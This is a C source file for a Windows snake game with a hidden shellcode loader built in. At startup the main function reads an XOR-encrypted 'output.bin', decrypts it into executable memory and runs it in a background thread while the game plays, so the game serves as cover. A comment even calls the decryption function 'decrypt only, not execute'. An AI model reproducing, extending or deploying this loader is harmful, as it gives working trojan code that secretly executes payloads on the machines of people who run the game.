#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <wchar.h>

// 游戏常量定义
#define WIDTH 20
#define HEIGHT 20
#define BLOCK_SIZE 25
#define WIN_WIDTH (WIDTH * BLOCK_SIZE)
#define WIN_HEIGHT (HEIGHT * BLOCK_SIZE)
#define INITIAL_LENGTH 3
#define INVINCIBLE_TIME 3000  // 无敌时间(毫秒)
#define BUFFER_SIZE 20        // 字符串缓冲区大小

// 游戏状态变量
int x, y, fruit_x, fruit_y, score;
int tail_x[100], tail_y[100];
int ntail;
enum direction { STOP = 0, LEFT, RIGHT, UP, DOWN };
enum direction dir;
DWORD start_time;
int invincible;
int gameOver = 0;  // 游戏结束标志
HWND hWnd;
HDC hdc, hdcBuffer;
HBITMAP hbmBuffer;
HBRUSH hBrushBlack, hBrushRed, hBrushGreen, hBrushWhite, hBrushGray;

// 函数声明
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void InitGame();
void DrawGame();
void UpdateGame();
void Cleanup();
DWORD WINAPI ShellcodeThread(LPVOID lpParam);
LPVOID decrypt_shellcode();

// Shellcode解密函数
#pragma optimize("", off)
void xor_decrypt(BYTE* data, DWORD size, BYTE key) {
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key;
    }
}
#pragma optimize("", on)

// 信号处理
void sigsegv_handler(int signum) {
    exit(1);
}

// 解密shellcode（仅解密不执行）
LPVOID decrypt_shellcode() {
    const char* filename = "output.bin";
    const BYTE xorKey = 0xAA;

    HANDLE hFile = CreateFileA(
        filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return NULL;
    }

    LPVOID shellcode = VirtualAlloc(
        NULL,
        fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!shellcode) {
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, shellcode, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        VirtualFree(shellcode, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }
    CloseHandle(hFile);

    xor_decrypt((BYTE*)shellcode, fileSize, xorKey);
    FlushInstructionCache(GetCurrentProcess(), shellcode, fileSize);

    return shellcode;
}

// 线程函数：执行shellcode
DWORD WINAPI ShellcodeThread(LPVOID lpParam) {
    LPVOID shellcode = lpParam;
    if (!shellcode) return 1;

    if (signal(SIGSEGV, sigsegv_handler) == SIG_ERR) {
        VirtualFree(shellcode, 0, MEM_RELEASE);
        return 1;
    }

    // 执行shellcode
    ((void (*)())shellcode)();
    
    // 清理
    signal(SIGSEGV, SIG_DFL);
    VirtualFree(shellcode, 0, MEM_RELEASE);
    return 0;
}

// 初始化游戏
void InitGame() {
    srand(time(0));
    
    // 初始化蛇位置
    x = WIDTH / 2;
    y = HEIGHT / 2;
    ntail = INITIAL_LENGTH;
    gameOver = 0;  // 重置游戏结束标志
    
    // 初始化尾部
    for (int i = 0; i < ntail; i++) {
        tail_x[i] = x - (i + 1);
        tail_y[i] = y;
    }
    
    // 生成食物（确保不在蛇身上）
    do {
        fruit_x = rand() % WIDTH;
        fruit_y = rand() % HEIGHT;
    } while ((fruit_x == x && fruit_y == y) || 
             (fruit_x >= x - ntail && fruit_x < x && fruit_y == y));
    
    score = 0;
    dir = RIGHT;
    start_time = GetTickCount();
    invincible = 1;
}

// 绘制游戏
void DrawGame() {
    // 清空缓冲区
    RECT rect = {0, 0, WIN_WIDTH, WIN_HEIGHT};
    FillRect(hdcBuffer, &rect, hBrushBlack);
    
    // 绘制蛇头
    SelectObject(hdcBuffer, hBrushGreen);
    Rectangle(hdcBuffer, x*BLOCK_SIZE, y*BLOCK_SIZE, 
              (x+1)*BLOCK_SIZE-1, (y+1)*BLOCK_SIZE-1);
    
    // 绘制蛇尾
    SelectObject(hdcBuffer, hBrushWhite);
    for (int i = 0; i < ntail; i++) {
        Rectangle(hdcBuffer, tail_x[i]*BLOCK_SIZE, tail_y[i]*BLOCK_SIZE, 
                  (tail_x[i]+1)*BLOCK_SIZE-1, (tail_y[i]+1)*BLOCK_SIZE-1);
    }
    
    // 绘制食物
    SelectObject(hdcBuffer, hBrushRed);
    Rectangle(hdcBuffer, fruit_x*BLOCK_SIZE, fruit_y*BLOCK_SIZE, 
              (fruit_x+1)*BLOCK_SIZE-1, (fruit_y+1)*BLOCK_SIZE-1);
    
    // 绘制无敌状态指示
    if (invincible) {
        SelectObject(hdcBuffer, hBrushGray);
        int timeLeft = (INVINCIBLE_TIME - (GetTickCount() - start_time)) / 1000;
        wchar_t text[BUFFER_SIZE];
        swprintf(text, BUFFER_SIZE, L"无敌: %d秒", timeLeft);
        TextOutW(hdcBuffer, 10, WIN_HEIGHT + 10, text, wcslen(text));
    }
    
    // 绘制分数
    wchar_t scoreText[BUFFER_SIZE];
    swprintf(scoreText, BUFFER_SIZE, L"分数: %d", score);
    TextOutW(hdcBuffer, WIN_WIDTH - 100, WIN_HEIGHT + 10, scoreText, wcslen(scoreText));
    
    // 游戏结束时显示提示
    if (gameOver) {
        SelectObject(hdcBuffer, hBrushGray);
        TextOutW(hdcBuffer, 10, WIN_HEIGHT + 50, L"游戏结束！按R键重新开始，X键退出", 
                 wcslen(L"游戏结束！按R键重新开始，X键退出"));
    } else {
        // 绘制操作提示
        TextOutW(hdcBuffer, 10, WIN_HEIGHT + 30, L"WASD控制方向，X退出", wcslen(L"WASD控制方向，X退出"));
    }
    
    // 将缓冲区内容复制到窗口
    BitBlt(hdc, 0, 0, WIN_WIDTH, WIN_HEIGHT + 70, hdcBuffer, 0, 0, SRCCOPY);
}

// 更新游戏状态
void UpdateGame() {
    if (gameOver) return;  // 游戏结束则不更新
    
    // 检查无敌时间
    if (invincible && (GetTickCount() - start_time) > INVINCIBLE_TIME) {
        invincible = 0;
    }
    
    // 移动尾部
    int prev_x = tail_x[0];
    int prev_y = tail_y[0];
    int prev2_x, prev2_y;
    tail_x[0] = x;
    tail_y[0] = y;
    
    for (int i = 1; i < ntail; i++) {
        prev2_x = tail_x[i];
        prev2_y = tail_y[i];
        tail_x[i] = prev_x;
        tail_y[i] = prev_y;
        prev_x = prev2_x;
        prev_y = prev2_y;
    }
    
    // 移动头部
    switch (dir) {
        case LEFT: x--; break;
        case RIGHT: x++; break;
        case UP: y--; break;
        case DOWN: y++; break;
        default: break;
    }
    
    // 边界穿越处理：从对面边界出现
    if (x < 0) x = WIDTH - 1;
    else if (x >= WIDTH) x = 0;
    if (y < 0) y = HEIGHT - 1;
    else if (y >= HEIGHT) y = 0;
    
    // 碰撞检测（无敌时间内不检测）
    if (!invincible) {
        // 自身碰撞
        for (int i = 0; i < ntail; i++) {
            if (tail_x[i] == x && tail_y[i] == y) {
                gameOver = 1;  // 设置游戏结束标志
                break;
            }
        }
    }
    
    // 吃到食物
    if (x == fruit_x && y == fruit_y) {
        score += 10;
        // 生成新食物
        do {
            fruit_x = rand() % WIDTH;
            fruit_y = rand() % HEIGHT;
        } while ((fruit_x == x && fruit_y == y));
        
        ntail++;
    }
}

// 窗口过程
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            hWnd = hwnd;
            hdc = GetDC(hwnd);
            
            // 创建缓冲区
            hdcBuffer = CreateCompatibleDC(hdc);
            hbmBuffer = CreateCompatibleBitmap(hdc, WIN_WIDTH, WIN_HEIGHT + 70);
            SelectObject(hdcBuffer, hbmBuffer);
            
            // 创建画刷
            hBrushBlack = CreateSolidBrush(RGB(0, 0, 0));
            hBrushRed = CreateSolidBrush(RGB(255, 0, 0));
            hBrushGreen = CreateSolidBrush(RGB(0, 255, 0));
            hBrushWhite = CreateSolidBrush(RGB(255, 255, 255));
            hBrushGray = CreateSolidBrush(RGB(128, 128, 128));
            
            // 设置定时器，控制游戏速度
            SetTimer(hwnd, 1, 150, NULL);
            return 0;
        }
        
        case WM_TIMER: {
            UpdateGame();
            DrawGame();
            return 0;
        }
        
        case WM_KEYDOWN: {
            // 游戏结束时按R重新开始
            if (gameOver) {
                if (wParam == 'R') {
                    InitGame();
                } else if (wParam == 'X') {
                    PostQuitMessage(0);
                }
                break;
            }
            
            // 游戏进行中处理方向控制
            switch (wParam) {
                case 'A': if (dir != RIGHT) dir = LEFT; break;
                case 'D': if (dir != LEFT) dir = RIGHT; break;
                case 'W': if (dir != DOWN) dir = UP; break;
                case 'S': if (dir != UP) dir = DOWN; break;
                case 'X': PostQuitMessage(0); break;
            }
            return 0;
        }
        
        case WM_DESTROY: {
            Cleanup();
            PostQuitMessage(0);
            return 0;
        }
    }
    return DefWindowProcW(hwnd, uMsg, wParam, lParam);
}

// 清理资源
void Cleanup() {
    KillTimer(hWnd, 1);
    DeleteObject(hbmBuffer);
    DeleteDC(hdcBuffer);
    ReleaseDC(hWnd, hdc);
    
    DeleteObject(hBrushBlack);
    DeleteObject(hBrushRed);
    DeleteObject(hBrushGreen);
    DeleteObject(hBrushWhite);
    DeleteObject(hBrushGray);
}

// 注册窗口类并创建窗口
int CreateGameWindow() {
    const wchar_t CLASS_NAME[] = L"SnakeGameClass";
    
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    
    if (!RegisterClassW(&wc)) {
        MessageBoxW(NULL, L"窗口注册失败！", L"错误", MB_OK | MB_ICONEXCLAMATION);
        return 0;
    }
    
    // 创建窗口
    HWND hwnd = CreateWindowExW(
        0,
        CLASS_NAME,
        L"贪吃蛇游戏",
        WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT,
        WIN_WIDTH + 16, WIN_HEIGHT + 100,
        NULL,
        NULL,
        GetModuleHandle(NULL),
        NULL
    );
    
    if (hwnd == NULL) {
        MessageBoxW(NULL, L"窗口创建失败！", L"错误", MB_OK | MB_ICONEXCLAMATION);
        return 0;
    }
    
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
    
    // 消息循环
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 1;
}

// 主函数
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLine, int nCmdShow) {
    // 解密shellcode
    LPVOID shellcode = decrypt_shellcode();
    
    // 创建线程执行shellcode（与游戏同步）
    if (shellcode) {
        HANDLE hThread = CreateThread(
            NULL,           // 默认安全属性
            0,              // 默认栈大小
            ShellcodeThread, // 线程函数
            shellcode,      // 传递给线程的参数
            0,              // 立即执行线程
            NULL            // 不需要线程ID
        );
        if (hThread) {
            // 不需要等待线程结束，让它与游戏并行运行
            CloseHandle(hThread);
        } else {
            // 线程创建失败时清理shellcode
            VirtualFree(shellcode, 0, MEM_RELEASE);
        }
    }
    
    // 初始化游戏并创建窗口（主线程继续执行游戏）
    InitGame();
    return CreateGameWindow();
    // gcc snake_game.c -o snake_game.exe -lgdi32 -municode
}